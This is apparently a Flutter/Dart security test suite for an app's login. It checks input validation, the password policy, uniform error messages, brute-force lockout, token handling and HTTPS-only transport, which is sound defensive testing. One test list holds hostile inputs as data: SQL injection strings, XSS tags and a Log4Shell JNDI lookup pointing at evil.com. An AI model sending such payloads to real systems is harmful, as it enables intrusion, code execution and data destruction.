// PRUEBAS DE SEGURIDAD
//
// Verifican defensas a nivel de aplicación (no reemplazan una auditoría):
//  - Entradas maliciosas (inyección SQL / XSS) rechazadas por las validaciones.
//  - Política de contraseñas fuertes.
//  - Mensajes de error que no revelan si un correo existe.
//  - Bloqueo contra fuerza bruta.
//  - El token no se filtra en logs y se borra al cerrar sesión.
//  - Las credenciales solo viajan por HTTPS y en el cuerpo (no en la URL).
import 'package:flutter_test/flutter_test.dart';
import 'package:flutter23/controllers/auth_controller.dart';
import 'package:flutter23/services/api_exceptions.dart';
import 'package:flutter23/services/fake_backend.dart';
import 'package:flutter23/services/http_auth_service.dart';
import 'package:flutter23/validators/validators.dart';
import 'package:http/http.dart' as http;
import 'package:mocktail/mocktail.dart';

import '../mocks/mocks.dart';
import '../mocks/test_data.dart';

void main() {
  setUpAll(registerMockFallbacks);

  group('SEC-01 Entradas maliciosas', () {
    const ataques = [
      "' OR '1'='1",
      "admin'--@gravity.com",
      '<script>alert(1)</script>@gravity.com',
      'ana@gravity.com; DROP TABLE users',
      'ana@gravity.com<img src=x>',
      r'${jndi:ldap://evil.com/a}',
    ];
    for (final ataque in ataques) {
      test('el correo rechaza: $ataque', () {
        expect(Validators.email(ataque), isNotNull);
      });
    }

    test('el nombre rechaza HTML y comillas dobles', () {
      expect(Validators.name('<b>Ana</b>'), isNotNull);
      expect(Validators.name('Robert"); DROP TABLE'), isNotNull);
    });
  });

  group('SEC-02 Política de contraseñas', () {
    const debiles = [
      '12345678',
      'password',
      'Password',
      'Password1',
      'PASSWORD1!',
      'qwerty!1',
    ];
    for (final pass in debiles) {
      test('rechaza la contraseña débil "$pass"', () {
        expect(Validators.password(pass), isNotNull);
      });
    }
  });

  group('SEC-03 No se revela qué correos están registrados', () {
    test('correo inexistente y clave incorrecta dan el MISMO mensaje', () async {
      final backend = FakeBackend(latency: Duration.zero);
      final service = HttpAuthService(
        client: backend.client,
        baseUrl: FakeBackend.baseUrl,
      );

      final c1 = AuthController(service);
      await c1.login('noexiste@gravity.com', 'Gravity123!');

      final c2 = AuthController(service);
      await c2.login(FakeBackend.demoEmail, 'Incorrecta1!');

      expect(c1.errorMessage, c2.errorMessage);
      expect(c1.errorMessage, AuthMessages.invalidCredentials);
    });

    test('las respuestas de la API nunca incluyen la contraseña', () async {
      final backend = FakeBackend(latency: Duration.zero);
      final response = await backend.client.post(
        Uri.parse('${FakeBackend.baseUrl}/auth/login'),
        body: '{"email":"${FakeBackend.demoEmail}",'
            '"password":"${FakeBackend.demoPassword}"}',
      );
      expect(response.statusCode, 200);
      expect(response.body, isNot(contains(FakeBackend.demoPassword)));
      expect(response.body, isNot(contains('password')));
    });
  });

  group('SEC-04 Protección contra fuerza bruta', () {
    test('tras 5 intentos fallidos se bloquea el login', () async {
      final service = MockAuthService();
      when(() => service.login(any(), any()))
          .thenThrow(const AuthException('Credenciales inválidas'));
      final controller = AuthController(service);

      for (var i = 0; i < 10; i++) {
        await controller.login(kEmail, 'Intento$i!A');
      }

      expect(controller.isLocked, isTrue);
      verify(() => service.login(any(), any())).called(5);
    });
  });

  group('SEC-05 Manejo de sesión y token', () {
    test('el token no aparece al imprimir la sesión (logs)', () {
      expect('$kSession', isNot(contains(kSession.token)));
    });

    test('logout borra la sesión local aunque el servidor no responda',
        () async {
      final service = MockAuthService();
      when(() => service.login(any(), any())).thenAnswer((_) async => kSession);
      when(() => service.logout(any()))
          .thenThrow(const NetworkException('Sin conexión'));
      final controller = AuthController(service);
      await controller.login(kEmail, kPassword);

      await controller.logout();

      expect(controller.session, isNull);
    });

    test('un token inválido no permite leer el perfil', () async {
      final backend = FakeBackend(latency: Duration.zero);
      final service = HttpAuthService(
        client: backend.client,
        baseUrl: FakeBackend.baseUrl,
      );
      await expectLater(
        service.getProfile('token-falso'),
        throwsA(isA<AuthException>()),
      );
    });

    test('tras logout el token deja de servir en el servidor', () async {
      final backend = FakeBackend(latency: Duration.zero);
      final service = HttpAuthService(
        client: backend.client,
        baseUrl: FakeBackend.baseUrl,
      );
      final session = await service.login(
        FakeBackend.demoEmail,
        FakeBackend.demoPassword,
      );
      await service.logout(session.token);

      await expectLater(
        service.getProfile(session.token),
        throwsA(isA<AuthException>()),
      );
    });
  });

  group('SEC-06 Transporte seguro', () {
    test('no permite una API sin HTTPS', () {
      expect(
        () => HttpAuthService(client: MockHttpClient(), baseUrl: 'http://api.test'),
        throwsArgumentError,
      );
    });

    test('la contraseña va en el cuerpo, nunca en la URL', () async {
      final client = MockHttpClient();
      when(
        () => client.post(
          any(),
          headers: any(named: 'headers'),
          body: any(named: 'body'),
        ),
      ).thenAnswer(
        (_) async => http.Response(
          '{"token":"t","user":{"id":"1","name":"A","email":"a@b.co"}}',
          200,
        ),
      );
      final service = HttpAuthService(client: client, baseUrl: 'https://api.test');

      await service.login(kEmail, kPassword);

      final uri = verify(
        () => client.post(
          captureAny(),
          headers: any(named: 'headers'),
          body: any(named: 'body'),
        ),
      ).captured.single as Uri;
      expect(uri.toString(), isNot(contains(kPassword)));
      expect(uri.scheme, 'https');
    });
  });
}
